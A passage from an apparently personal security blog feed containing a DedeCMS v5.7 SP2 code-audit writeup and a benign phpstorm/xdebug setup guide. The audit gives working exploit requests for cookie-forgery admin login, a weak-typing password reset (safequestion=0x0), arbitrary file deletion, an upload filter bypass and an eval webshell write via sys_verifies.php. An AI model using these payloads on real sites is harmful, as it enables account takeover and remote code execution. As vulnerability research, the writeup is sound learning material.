class="variable">$this</span>-&gt;keepUserNameTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;userName;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserPurviewTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;userPurview;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepAdminStyleTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$adminstyle</span>;</span><br></pre></td></tr></table></figure><a id="more"></a><p>替换为如下代码:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;keepUserIDTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;userID;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;keepUserTypeTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;userType;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;keepUserChannelTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;userChannel;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;keepUserNameTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;userName;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;keepUserPurviewTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;userPurview;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$this</span>-&gt;keepAdminStyleTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$adminstyle</span>;</span><br></pre></td></tr></table></figure><p>364到368替换如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserIDTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserTypeTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserChannelTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserNameTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserPurviewTag);</span><br></pre></td></tr></table></figure><h3 id="cookie伪造导致任意前台用户登录"><a href="#cookie伪造导致任意前台用户登录" class="headerlink" title="cookie伪造导致任意前台用户登录"></a><strong>cookie伪造导致任意前台用户登录</strong></h3><ul><li><p>漏洞分析</p><p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20103333.png" alt="屏幕截图 2021-03-13 103333"></p><p> 跟进<code>PutCookie</code>方法，在该方法中的第27行中将值与配置文件中的<code>$cfg_cookie_encode</code>进行拼接，然后进行MD5和截断处理<code>substr(md5($cfg_cookie_encode.$value),0,16)</code>，然后下发到客户端</p><p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313104510453.png" alt="image-20210313104510453"></p><p> 而在<code>include/common.inc.php</code>使用的外部变量注册的方法进行变量声明，因此此处的$uid是用户可控的。</p><p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20104107.png" alt="屏幕截图 2021-03-13 104107"></p><p> 这里我们就可以获取到任意用户的<code>last_vid</code> <code>last_vid__ckMd5</code></p><p> 而在文件<code>include/helpers/cookie.helper.php</code>中的第54-72行的GetCookie方法的代码块，其中第63行用于校验客户端cookie是否进行了伪造，因此要进行cookie就自然想到要获取<code>uploads/data/config.cache.inc.php</code>文件中的内容，需要存在任意文件读取或下载的漏洞，当然还有另外一种方式，就是控制<code>$uid</code>，利用PutCookie直接生成cookie，这样的cookie定会通过GetCookie方法。</p><p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313105340716.png" alt="image-20210313105340716"></p></li></ul><p>   接着查看登录相关的代码，看它的cookie生成方法是否是PutCookie。在<code>include/memberlogin.class.php</code> 498行PutLoginInfo方法处理正确输入用户名和密码的情况</p><p>   <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313112216221.png" alt="image-20210313112216221"></p><p>   继续跟进PutLoginInfo方法，果然用的是PutCookie方法，存在cookie伪造漏洞</p><p>   <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20112733.png" alt="屏幕截图 2021-03-13 112733"></p><p>   在文件<code>include/memberlogin.class.php</code>的第160-242行发现代码块，其中第170行检测cookie中的DedeUserID参数的值，178行将这个值转换为整数，185行通过这个给值来查询用户。我们通过伪造DedeUserID即可任意用户登录了。</p><p>   <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20121536.png" alt="屏幕截图 2021-03-13 121536"></p><ul><li><p>漏洞复现</p><p> 情况一：</p><p> 由于mid在数据库中是int，所以要进行cookie的伪造需要注册用户名为要越权的用户mid数值，而admin默认为1。因此可以直接登录为admin。</p><p> 需要注册用户名为对应数据库中dede_member表中mid对应的值。如注册用户名为0001对应dede_member表中mid为1，便是admin的mid。</p><p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20123051.png" alt="屏幕截图 2021-03-13 123051"></p></li></ul><p>然后访问<code>/member/index.php?uid=0001</code>获取伪造的cookie</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20130027.png" alt="屏幕截图 2021-03-13 130027"></p><p>最后访问<code>/member/index.php</code>并带上cookie即可</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20130235.png" alt="屏幕截图 2021-03-13 130235"></p><p>​    情况二：</p><p>​    在<code>member/index.php</code>文件第124行，当uid不为空时会<code>require_once(DEDEMEMBER.&#39;/inc/config_space.php&#39;)</code></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313131650792.png" alt="image-20210313131650792"></p><p>​    跟进<code>member/inc/config_space.php</code>在第29行调用了GetUserSpaceInfos方法</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313131855022.png" alt="image-20210313131855022"></p><p>​    跟进GetUserSpaceInfos方法，其SQL查询语句使用了<code>like</code>获取数据，通过构造特殊的用户名即可让其下发伪造cookie</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20131954.png" alt="屏幕截图 2021-03-13 131954"></p><p>这里我们假设要登录mid为5的用户</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313132505860.png" alt="image-20210313132505860"></p><p>我们先注册类似于<code>xx5xx</code>的用户</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313132632833.png" alt="image-20210313132632833"></p><p>然后访问<code>/member/index.php?uid=%5%</code>获取伪造cookie</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20132811.png" alt="屏幕截图 2021-03-13 132811"></p><p>加上cookie访问<code>/member/index.php</code></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313132944373.png" alt="image-20210313132944373"></p><h3 id="任意修改前台用户密码"><a href="#任意修改前台用户密码" class="headerlink" title="任意修改前台用户密码"></a><strong>任意修改前台用户密码</strong></h3><ul><li><p>漏洞分析</p><p>在<code>member/resetpassword.php</code>75-99行，进行安全问题的判断。默认<code>$row[&#39;safequestion&#39;]</code>在数据库的内容为<code>&#39;0&#39;</code>，<code>$row[&#39;safeanswer&#39;]</code>在数据库中的结果为<code>&#39;&#39;</code>，且变量<code>$safeanswer</code>与<code>$safequestion</code>是用户可控制的变量，又使用了 ==进行判断， 因此该判断规则存在弱类型问题。如果用户在注册时设置了密保问题则没有这个问题</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20151940.png" alt="屏幕截图 2021-03-13 151940"></p><p>这里打印下$row</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20153731.png" alt></p><p>对于<code>$safeanswer</code>我们不传值，经过85行处理也会为空，从而相等。</p><p>对于<code>$safequestion</code>我们需要传一个值使其绕过<code>empyt()</code>且等于<code>‘0’</code>。</p><p>根据手册，我们可以构造出 </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.0</span>(作为字符串)</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0e0</span></span><br><span class="line"><span class="number">0e1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313155728546.png" alt="image-20210313155728546"></p></li></ul><ul><li><p>漏洞复现</p><p>先进行如下请求获取key</p><p><code>/member/resetpassword.php?dopost=safequestion&amp;safequestion=0x0&amp;safeanswer=&amp;id=2</code> </p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20160236.png" alt="屏幕截图 2021-03-13 160236"></p></li></ul><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313160537171.png" alt="image-20210313160537171"></p><h3 id="任意重置后台用户密码"><a href="#任意重置后台用户密码" class="headerlink" title="任意重置后台用户密码"></a><strong>任意重置后台用户密码</strong></h3><ul><li><p>漏洞分析</p><p>在<code>member/edit_baseinfo.php</code> 118-123行修改前端密码同时也会修改后端密码</p></li></ul><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313161155719.png" alt="image-20210313161155719"></p><h3 id="前台任意文件删除"><a href="#前台任意文件删除" class="headerlink" title="前台任意文件删除"></a><strong>前台任意文件删除</strong></h3><ul><li><p>漏洞分析</p><p>问题出在<code>member/inc/inc_batchup.php</code>的<code>DelArc</code>方法，对于<code>$licp[&#39;litpic&#39;]</code>直接拼接在目录后面只检测文件存不存在，没有检查文件类型就直接删除。重点在于这个<code>litpic</code>我们是否可控</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313204533734.png" alt="image-20210313204533734"></p><p>接着全局搜索了<code>litpic</code>变量，发现<code>member/inc/archives_check_edit.php</code>发现79-93行可以通过控制<code>$oldlitpic</code>来<code>litpic</code>。在<code>$litpic</code>为空的情况下，<code>$litpic=$oldlitpic</code>。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314155059165.png" alt="image-20210314155059165"></p><p>接着全局搜索<code>archives_check_edit</code></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314152654346.png" alt="image-20210314152654346"></p><p>也就是这四个功能受影响</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20155544.png" alt="屏幕截图 2021-03-14 155544"></p><p>而在上传图集的功能里，同样可控<code>litpic</code> 在<code>member/album_add.php</code> 88-103行，在<code>$formhtml==1 &amp;&amp; $ddisfirst==1 &amp;&amp; $litpic==&#39;&#39; &amp;&amp; !empty($litpicname)</code>下<code>$litpic==$litpicname</code></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20160450.png" alt="屏幕截图 2021-03-14 160450"></p><p><code>$formhtml</code>可传参控制，<code>$ddisfirst</code>默认为1,至于<code>$litpic</code>我们跟进<code>archives_check.php</code>，在100-102行</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314161257476.png" alt="image-20210314161257476"></p><p>跟进<code>MemberUploads</code>方法，在<code>include/helpers/upload.helper.php</code> 118-240行，其中215-222行是关键在不上传缩略图的情况下会进入else分支，同时<code>MemberUploads</code>的<code>handname</code>参数默认为空。即返回值也为空。所以<code>$litpic</code>可控</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314161619071.png" alt="image-20210314161619071"></p><p>最后全局搜索<code>DelArc</code>函数查找触发点，在<code>member/archives_do.php</code>，有个<code>issystem</code>的判断</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314162605298.png" alt="image-20210314162605298"></p><p>数据库查询一下，默认情况下出了<code>infos</code>其他都会调用<code>DelArc</code>删除文件。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314162729095.png" alt="image-20210314162729095"></p></li><li><p>漏洞复现</p><p>情况一：</p><p>以文章为例 </p><p>先发表文章，内容随意填</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314164413817.png" alt="image-20210314164413817"></p><p>再修改文章同时加上<code>oldlitpic</code>的值</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20164614.png" alt="屏幕截图 2021-03-14 164614"></p><p>数据库：</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314164927927.png" alt="image-20210314164927927"></p><p>最后删除文章即可删除<code>oldlitpic</code>指向的文件。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20165328.png" alt="屏幕截图 2021-03-14 165328"></p><p>情况二：</p><p>上传图集时添加<code>formhtml</code>和<code>litpicname</code>即可</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314165944131.png" alt="image-20210314165944131"></p><p>删除图集</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314170320939.png" alt="image-20210314170320939"></p></li></ul><h3 id="前台任意文件上传"><a href="#前台任意文件上传" class="headerlink" title="前台任意文件上传"></a><strong>前台任意文件上传</strong></h3><ul><li><p>漏洞分析</p><p>上传需要admin权限，有点鸡肋。但配合之前的cookie伪造也还行。</p><p>问题在<code>include/dialog/select_images_post.php</code>对于后缀的处理逻辑有问题。在36行获取文件名,然后过滤。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210316211925145.png" alt="image-20210316211925145"></p><p>这个文件名就是我们上传的文件名，具体的调用是</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">select_images_post</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt; <span class="selector-tag">config</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt; <span class="selector-tag">common</span><span class="selector-class">.inc</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt;  <span class="selector-tag">uploadsafe</span><span class="selector-class">.inc</span><span class="selector-class">.php</span></span><br></pre></td></tr></table></figure><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20212521.png" alt="屏幕截图 2021-03-16 212521"></p><p>接着在58到64行进行后缀拼接和上传。直接通过<code>.</code>来分割文件名，将最后一个后缀作为文件后缀。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20212843.png" alt="屏幕截图 2021-03-16 212843"></p><p>通过构造类似</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p<span class="comment">%hp</span></span><br><span class="line">p*hp</span><br><span class="line">p&lt;hp</span><br><span class="line">p?hp</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>即可绕过上传。</p></li><li><p>漏洞利用</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20213715.png" alt="屏幕截图 2021-03-16 213715"></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20215140.png" alt="屏幕截图 2021-03-16 215140"></p></li></ul><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210316215503126.png" alt="image-20210316215503126"></p><h3 id="后台文件写入"><a href="#后台文件写入" class="headerlink" title="后台文件写入"></a>后台文件写入</h3><ul><li><p>漏洞分析</p><p>又是需要后台admin权限，太鸡肋了。DedeCMS后台本来就带有文件管理器，本着学习的态度就记录一下。</p><p>问题出在<code>dede/sys_verifies.php</code>，<code>fwrite</code>的参数未经过过滤，导致文件写入，配合<code>require_once</code>getshell</p></li></ul><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20190619.png" alt="屏幕截图 2021-03-17 190619"></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20191424.png" alt="屏幕截图 2021-03-17 191424"></p><ul><li><p>漏洞复现</p><p>访问<code>/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\&quot;;eval($_GET[a]);die();//</code> 写入文件</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317191752815.png" alt="image-20210317191752815"></p><p>访问<code>/dede/sys_verifies.php?action=down&amp;a=phpinfo();</code>执行命令</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317191855712.png" alt="image-20210317191855712"></p></li></ul><h3 id="后台二次注入getshell"><a href="#后台二次注入getshell" class="headerlink" title="后台二次注入getshell"></a>后台二次注入getshell</h3><ul><li><p>漏洞分析</p><p>在<code>dede/ad_add.php</code>80-83行，参数<code>$normbody</code>未经过滤就放入数据库中</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20193957.png" alt="屏幕截图 2021-03-17 193957"></p><p>而在<code>plus/ad_js.php</code> 21-44行，查询结果直接包含。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20194249.png" alt="屏幕截图 2021-03-17 194249"></p></li><li><p>复现漏洞</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317194532192.png" alt="image-20210317194532192"></p></li></ul><p>  <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317194553335.png" alt="image-20210317194553335"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/column/161703.html" target="_blank" rel="noopener">https://www.freebuf.com/column/161703.html</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/12741373.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpchcbd/p/12741373.html</a></p>]]></content>
    
    <summary type="html">
    
      开始学习审计CMS
    
    </summary>
    
    
      <category term="代码审计" scheme="https://0xcreed.jxustctf.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="CMS" scheme="https://0xcreed.jxustctf.top/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>phpstrom+xdebug调试代码</title>
    <link href="https://0xcreed.jxustctf.top/2021/01/phpstrom-xdebug%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81/"/>
    <id>https://0xcreed.jxustctf.top/2021/01/phpstrom-xdebug%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81/</id>
    <published>2021-01-19T10:39:28.000Z</published>
    <updated>2021-07-27T00:54:56.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>​        接下来想审计几个开源的cms，工欲善其事必先利其器，这里我用的是phpstrom+xdebug+phpstudy的组合。安装phpstrom和phpstudy这个不多说。</p><h3 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h3><p>​        注意这里不要使用apache作为中间件，这样会导致调试过程中会话丢失(大概1分钟不到)。</p><a id="more"></a><p>后来发现其实是phpstudy的apache默认配置问题，修改一下就行</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210727084808790.png" alt="image-20210727084808790"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;IfModule</span> <span class="string">mod_fcgid.c&gt;</span></span><br><span class="line"><span class="comment"># php-cgi进程的生存时间</span></span><br><span class="line">true<span class="attr">FcgidProcessLifeTime</span> <span class="string">9999</span></span><br><span class="line"><span class="comment"># php-cgi进程IO超时时间</span></span><br><span class="line">    <span class="attr">FcgidIOTimeout</span> <span class="string">9999</span></span><br><span class="line"><span class="comment"># php-cgi进程连接超时时间</span></span><br><span class="line">    <span class="attr">FcgidConnectTimeout</span> <span class="string">9999</span></span><br><span class="line"><span class="comment"># 上传文件的最大尺寸 100MB</span></span><br><span class="line">true<span class="attr">FcgidMaxRequestLen</span> <span class="string">104857600</span></span><br><span class="line"><span class="comment"># php-cgi最大的进程数</span></span><br><span class="line"><span class="comment"># FcgidMaxProcesses 5</span></span><br><span class="line"><span class="attr">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure><p>先启动nginx和mysql</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119185312944.png" alt="image-20210119185312944"></p><p>再新建网站</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119190147445.png" alt="image-20210119190147445"></p><p>这个默认配置就行，注意使用<strong>cms推荐的php版本</strong>。</p><p>打开网站能正常访问就行。</p><p>同时在 管理-&gt;php扩展-&gt; 勾选xdebug</p><p>打开对应版本的php.ini文件</p><p>在<code>[xdebug]</code>项添加idekey和打开远程调试</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210121121958881.png" alt="image-20210121121958881"></p><h3 id="phpstorm"><a href="#phpstorm" class="headerlink" title="phpstorm"></a>phpstorm</h3><p>​        将网站根目录作为项目打开</p><p>打开设置选择php版本</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191031796.png" alt="image-20210119191031796"></p><p>下拉php列表</p><p>配置服务器和phpstudy相同就行</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191134264.png" alt="image-20210119191134264"></p><p>下拉调试</p><p>选择DBGp代理</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191229837.png" alt="image-20210119191229837"></p><p>这里要注意的是这三个值要和php.ini中的对应</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">xdebug.idekey</span>=PHPSTORM </span><br><span class="line"><span class="attr">xdebug.remote_host</span>=localhost </span><br><span class="line"><span class="attr">xdebug.remote_port</span>=<span class="number">9000</span></span><br></pre></td></tr></table></figure><p>在phpstorm 右上角添加配置</p><p>选择php web页面</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191734997.png" alt="image-20210119191734997"></p><p>点击 验证测试xdebug没问题</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191827554.png" alt="image-20210119191827554"></p><h3 id="浏览器安装Xdebug-helper"><a href="#浏览器安装Xdebug-helper" class="headerlink" title="浏览器安装Xdebug helper"></a>浏览器安装Xdebug helper</h3><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192132260.png" alt="image-20210119192132260"></p><p>在扩展选项中填写IDE key</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192225930.png" alt="image-20210119192225930"></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>先下好断点</p><p>然后点击监听</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192018629.png" alt="image-20210119192018629"></p><p>Shift+F10 运行</p><p>接着在浏览器将Xdebug helper选择debug模式</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192710255.png" alt="image-20210119192710255"></p><p>再去触发相应的代码，就能在断点处停下了</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119193010239.png" alt="image-20210119193010239"></p><p>接下来可以愉快的调试了！</p><p>对于运行在5.4及其以上的cms，调试时可以不使用phpstudy(需要xdebug插件),在右上角添加配置时选择php内置服务器即可</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119194552083.png" alt="image-20210119194552083"></p><p>这里是自己起了php监听，可以看到访问的请求，两种运行方法各有优劣。</p><p>后面又发现个问题</p><p>调试时会遇到debug会话未暂停的警告</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119194221935.png" alt="image-20210119194221935"></p><p>调试的网页也会报一个404错误，会影响后续的调试。</p><p>各种切换版本，修改配置，搜索引擎等操作，还是找不到解决办法。(救救孩子</p><p>所以打算弃了phpstudy，改用wsl2作为调试环境(我太难了)</p><p>后面发现，别偷懒直接设置在脚本第一行调试即可</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210727085451391.png" alt="image-20210727085451391"></p><h3 id="WSL2管理多版本php"><a href="#WSL2管理多版本php" class="headerlink" title="WSL2管理多版本php"></a>WSL2管理多版本php</h3><p>作为一个调试环境，如果只有一个php版本无疑是失败的！</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:ondrej/php    //添加仓库源</span><br><span class="line">sudo apt-get update  //更新源</span><br><span class="line">sudo apt-get install php5.6  //安装其他版本php</span><br><span class="line">sudo apt-get install php5.6-xdebug        //安装必须的插件</span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure><p>更多内容参考这篇<a href="https://justcode.ikeepstudying.com/2018/11/%E5%AE%89%E8%A3%85%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84php-php%E5%A4%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85-how-to-install-different-php-5-6-7-0-and-7-1-versions-in-ubuntu/" target="_blank" rel="noopener">文章</a></p><p>如果是kali等debian系可以参考一下命令</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install lsb-<span class="keyword">release</span> apt-transport-https ca-certificates </span><br><span class="line">sudo wget -O /etc/apt/<span class="keyword">trusted</span>.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg</span><br><span class="line">echo "deb https://packages.sury.org/php/ buster main" | sudo tee /etc/apt/sources.list.d/php.list</span><br></pre></td></tr></table></figure><h3 id="修改php-ini文件"><a href="#修改php-ini文件" class="headerlink" title="修改php.ini文件"></a>修改php.ini文件</h3><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123221353899.png" alt="image-20210123221353899"></p><p>添加 [xdebug]</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123224346250.png" 